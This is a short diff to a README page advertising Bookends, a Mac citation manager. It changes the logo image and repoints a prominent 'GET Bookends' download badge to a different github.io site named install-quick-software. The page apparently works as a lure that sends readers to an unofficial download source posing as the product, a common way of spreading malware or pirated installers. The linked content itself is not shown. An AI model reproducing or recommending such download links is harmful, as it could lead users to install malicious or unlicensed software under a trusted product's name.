@@ -1,13 +1,13 @@
 # Bookends – Intelligent Reference and Citation Management Software  
 
 <div align="center">  
-<img src="https://rk.md/wp-content/uploads/2021/02/bookends-reference-manager-logo.jpg" alt="Bookends Logo" width="300">  
+<img src="https://www.macappbox.com/uploads/20200705/c090932235774914db39a248097afc1b.png" alt="Bookends Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/bookends">  
+<a href="https://install-quick-software.github.io/.github/bookends">  
 <img src="https://img.shields.io/badge/💻_GET_Bookends-blueviolet?style=for-the-badge&logo=apple" alt="GET Bookends">  
 </a>  
 </div>
